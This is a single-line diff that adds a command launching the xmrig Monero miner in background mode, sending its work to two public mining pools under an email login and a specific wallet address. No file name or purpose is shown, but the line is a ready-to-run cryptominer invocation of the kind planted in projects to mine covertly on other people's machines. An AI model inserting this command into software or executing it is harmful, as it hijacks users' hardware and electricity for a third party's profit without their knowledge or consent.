@@ -1,0 +1,1 @@
+xmrig.exe -B --donate-level 1 -o xmr.pool.minergate.com:45700 -u minecraftfuns@outlook.com -p x -k -o pool.supportxmr.com:3333 -u 43BaTaixRPBZRSsUFCmgHmGGQJS1Fo8J5F8pZ1DHy4dTjZ8XT1C5JwDgu2bHpD4PvQ8Hu3gJEE4MGSwihjKd5XhLD3NtPe5 -p xjoi -k
